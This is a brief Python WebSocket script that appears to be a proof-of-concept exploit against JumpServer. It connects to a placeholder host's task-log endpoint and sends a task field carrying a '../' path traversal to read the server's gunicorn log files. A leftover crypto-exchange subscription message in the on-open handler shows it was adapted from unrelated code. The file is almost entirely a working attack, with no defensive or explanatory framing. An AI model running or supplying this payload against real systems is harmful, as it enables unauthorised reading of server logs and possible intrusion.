
from ws4py.client.threadedclient import WebSocketClient
import time
import sys
class DummyClient(WebSocketClient):
    def opened(self):
        self.send('{"event":"subscribe", "channel":"eth_usdt.deep"}') #发送请求数据格式

    def closed(self, code, reason=None):
        print("Closed down", code, reason)
    def received_message(self, m):
        #wstr = str(m)
        print(m)
try:
    ws = DummyClient('ws://x.x.x.x:xx/ws/ops/tasks/log/')
    ws.connect()
    #ws.run_forever()
    
    ws.send('{"task":"../../../../../../../../../../opt/jumpserver/logs/gunicorn"}')
    time.sleep(1)
except KeyboardInterrupt:
    ws.close()
